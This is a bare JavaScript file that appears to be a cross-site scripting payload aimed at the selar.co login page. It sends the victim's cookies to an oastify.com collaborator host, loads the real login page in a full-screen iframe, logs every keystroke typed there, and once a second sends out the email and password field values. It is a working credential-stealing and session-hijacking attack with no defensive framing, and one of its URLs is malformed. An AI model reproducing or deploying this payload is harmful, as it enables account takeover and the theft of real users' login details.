let currSession = "";
fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
document.body.style.setProperty('height', '100vh')
const iframe = document.createElement('iframe');
iframe.src = 'https://selar.co/login';
iframe.width = '100%';
iframe.height = '100%'; 
iframe.style.border = 'none';
iframe.onload = function () {
    console.log('Iframe has loaded successfully!');
    iframe.contentWindow.addEventListener('keydown', (event) => {    console.log(`Key pressed: ${event.key}`);
    currSession += `+${String(event.key)}`
    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${currSession}`, {mode: 'no-cors',});
});
};
document.body.appendChild(iframe);
//=================================================================================

setInterval(()=> {
    const iframe = document.querySelector('iframe');
    const element = iframe.contentDocument.evaluate('/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input', iframe.contentDocument, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    fetch(`https:a//4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`)
    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?direct-password-${document.getElementById("password").value}`)
}, 1000)


